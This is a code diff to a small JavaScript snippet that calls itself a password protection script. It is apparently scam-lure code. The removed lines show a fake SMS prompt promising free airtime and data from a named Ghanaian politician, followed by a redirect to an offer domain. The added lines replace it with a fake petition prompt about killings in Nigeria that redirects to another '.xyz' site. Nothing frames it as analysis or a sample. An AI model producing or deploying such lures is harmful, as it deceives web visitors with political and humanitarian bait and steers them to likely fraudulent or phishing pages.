@@ -1,7 +1,9 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '0k'
-password=prompt('SMS: Welcome to Ghana GH₵10 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != 'ok') {
-location.href='https://mahama.data-offer.xyz/15GB';
-
+var password = 'Sign Petition'
+password = prompt(
+  'SMS: Welcome! Help Sign The Petition To END THE KILLINGS AND INSECURITY IN NIGERIA. Please press OK to Proceed now.',
+  'Sign Petition'
+);
+if (password != 'Sign Petition') {
+  location.href = 'https://petition.goprogram.xyz/Sign';
 }
